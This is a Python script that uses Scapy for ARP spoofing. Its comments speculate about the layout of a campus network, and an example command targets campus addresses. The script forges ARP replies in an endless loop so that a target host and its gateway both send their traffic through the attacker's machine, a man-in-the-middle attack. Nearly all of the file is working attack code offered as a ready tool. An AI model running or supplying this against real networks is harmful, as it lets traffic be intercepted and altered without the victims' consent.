# ! /usr/bin/env python
# _*_coding;utf-8 _*_

# 校园网结构猜测：
# 所有校园网内的主机默认只回应网关的ARP包，不回应其他主机ARP包， 所以无法扫描到局域网内的主机
# 但是， 局域网通信的时候怎么能建立arp表呢？
# 通过搜索  说是校园网屏蔽了p2p
# python Get_MAC.py -g 10.66.64.1  -t 10.66.107.76  -i "Intel(R) Dual Band Wireless-AC 3160"


from scapy.all import *
import optparse
import threading
import time


def get_target_mac(targetIP):
    '''
    :param targetIP: 进行apr欺骗的目标主机ip
    :return: 目标主机MAC地址
    '''
    try:
        target = getmacbyip(targetIP)
        return target

    except Exception as e:
        print('[-]请检查目标IP是否存活')

def createArp2Station(srcMac, tgtMac, gatewayIP, tgtIP):
    '''
    生成ARP数据包，伪造网关欺骗目标计算机
    srcMac:本机的MAC地址，充当中间人
    tgtMac:目标计算机的MAC
    gatewayIP:网关的IP，将发往网关的数据指向本机（中间人），形成ARP攻击
    tgtIP:目标计算机的IP
    op=2,表示ARP响应
    '''
    pkt = Ether(src=srcMac, dst=tgtMac) / ARP(hwsrc=srcMac, psrc=gatewayIP, hwdst=tgtMac, pdst=tgtIP, op=2)
    return pkt


def createArp2Gateway(srcMac, gatewayMac, tgtIP, gatewayIP):
    '''
    生成ARP数据包，伪造目标计算机欺骗网关
    srcMac:本机的MAC地址，充当中间人
    gatewayMac:网关的MAC
    tgtIP:目标计算机的IP，将网关发往目标计算机的数据指向本机（中间人），形成ARP攻击
    gatewayIP:网关的IP
    op=2,表示ARP响应
    '''
    pkt = Ether(src=srcMac, dst=gatewayMac) / ARP(hwsrc=srcMac, psrc=tgtIP, hwdst=gatewayMac, pdst=gatewayIP, op=2)
    return pkt


def main():
    usage = 'Usage: %porg -t <targetip> -g <gatewayip> -i <interface> -a'
    parser = optparse.OptionParser(usage, version='v1.0')
    parser.add_option('-t', dest='targetIP', type='string', help='目标计算机ip')
    parser.add_option('-g', dest='gatewayIP', type='string', help='网关ip')
    parser.add_option('-i', dest='interface', type='string', help='指定使用的网卡')
    parser.add_option('-a', dest='allARP', action='store_true', help='是否进行全网arp欺骗')
    #  解析参数
    options,args = parser.parse_args()

    targetIP = options.targetIP
    gatewayIP = options.gatewayIP
    interface = options.interface

    if targetIP == None or gatewayIP == None or interface == None:
        print(parser.print_help())
        exit(1)

    # 获取本机MAC地址
    print("[+] 获取本机MAC地址")
    srcMAC = get_if_hwaddr(interface)
    print("本机MAC地址: {0}".format(srcMAC))

    # 发送ARP包获取目标MAC地址
    print("[+] 获取目标主机MAC地址")
    targetMAC = get_target_mac(targetIP)
    print("target MAC: {0}".format(targetMAC))

    # 获取网关MAC地址
    print("[+] 获取网关MAC地址")
    gatewayMAC = get_target_mac(gatewayIP)
    print("gateway MAC: {0}".format(gatewayMAC))

    ch = input("[+]是否继续： Y/N      ")
    if ch == 'N' or ch == 'n':
        exit(0)
    # 其他任意键继续

    pktstation = createArp2Station(srcMAC, targetMAC, gatewayIP, targetIP)
    pktgateway = createArp2Gateway(srcMAC, gatewayMAC, targetIP, gatewayIP)
    # pktstation = createARPStation(srcMAC, targetMAC, gatewayIP, targetIP)
    # pktgateway = createARPGateway(srcMAC, gatewayMAC, gatewayIP, targetIP)
    # p_gateway = ARP()
    # p_gateway.psrc=targetIP
    # p_gateway.pdst=gatewayIP
    # p_gateway.hwdst=targetMAC
    # p_gateway.op = 'is-at'
    #
    # p_target = ARP()
    # p_target.psrc=gatewayIP
    # p_target.pdst=targetIP
    # p_target.hwdst=gatewayMAC
    # p_target.op = 'is-at'
    #
    p_broadcast = ARP()
    p_broadcast.psrc = '192.168.3.12'
    p_broadcast.pdst = '0.0.0.0'
    p_broadcast.hwdst = 'ff:ff:ff:ff:ff:ff'
    p_broadcast.op = 'who-has'

    while True:
        i = 1
        # sendp(pktstation, iface=interface)
        # print("[+]发送第{0}计算机欺骗包".format(i))
        # sendp(pktgateway, iface=interface)
        # print("[+]发送第{0}计算机欺骗包".format(i))
        # # sendp(args=(pktstation,),kwargs={'iface':interface})
        # # print("[+]发送第{0}计算机欺骗包".format(i))
        # # sendp(args=(pktstation,),kwargs={'iface':interface})
        # # print("[+]发送第{0}计算机欺骗包".format(i))

        # send(p_gateway)
        # send(p_target)
        sendp(pktstation, iface=interface)
        send(p_broadcast)
        time.sleep(1)
        sendp(pktgateway, iface=interface)


if __name__ == '__main__':
    main()


